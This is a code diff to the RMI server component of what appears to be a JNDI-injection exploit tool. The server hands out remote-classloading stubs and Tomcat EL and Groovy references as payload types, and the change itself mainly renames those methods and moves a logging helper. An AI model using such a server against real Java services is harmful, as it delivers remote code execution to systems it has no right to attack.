@@ -16,10 +16,11 @@ class RMIServer {
     private val port = Options.rmiPort
     private val codebase = URL("http://${Options.address}:${Options.httpPort}/")
 
-    fun run() {
-        println("RMI server listening on 0.0.0.0:$port".blue())
+    private fun log(text: String) = println("RMI >> ".purple() + text)
 
+    fun run() {
         val server = java.net.ServerSocket(port)
+        log("Listening on ${Options.address}:$port".blue())
 
         while (true) {
             val socket = server.accept().apply { soTimeout = 5000 }
@@ -136,18 +137,19 @@ class RMIServer {
             UID().write(this)
         }
 
+        // key 和方法名一致
         val ref: Reference = when (rmiKey) {
             "ref" -> {
                 log("Sending remote classloading stub ($httpKey)")
-                execByRemoteRef(httpKey)
+                ref(httpKey)
             }
             "tomcat" -> {
-                log("Sending local classloading reference")
-                execByEL()
+                log("Sending local classloading reference (tomcat)")
+                el()
             }
             "groovy" -> {
-                log("Sending local classloading reference")
-                execByGroovy()
+                log("Sending local classloading reference (groovy)")
+                groovy()
             }
             else -> throw IOException("RMI >> Payload type not found")
         }
@@ -172,8 +174,6 @@ class RMIServer {
         log("A DGC call for ${oiStream.readObject() as Array<*>}")
     }
 }
-
-fun RMIServer.log(text: String) = println("RMI >> ".purple() + text)
 
 class MarshalOutputStream(stream: OutputStream, val url: URL?) : ObjectOutputStream(stream) {
     override fun annotateClass(cl: Class<*>?) {
